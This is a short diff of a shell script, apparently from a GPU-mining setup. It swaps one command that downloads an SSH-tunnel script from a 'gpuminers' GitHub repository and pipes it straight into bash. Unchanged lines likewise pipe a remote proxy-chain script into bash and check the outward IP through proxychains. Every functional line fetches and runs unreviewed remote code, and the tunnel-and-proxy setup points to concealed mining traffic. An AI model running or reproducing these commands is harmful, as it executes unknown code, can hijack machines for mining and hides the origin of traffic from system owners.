@@ -1,4 +1,4 @@
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/SetUpSSHTunnelWithSLES81.sh | bash
 wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
 sleep .1
 proxychains curl ifconfig.me
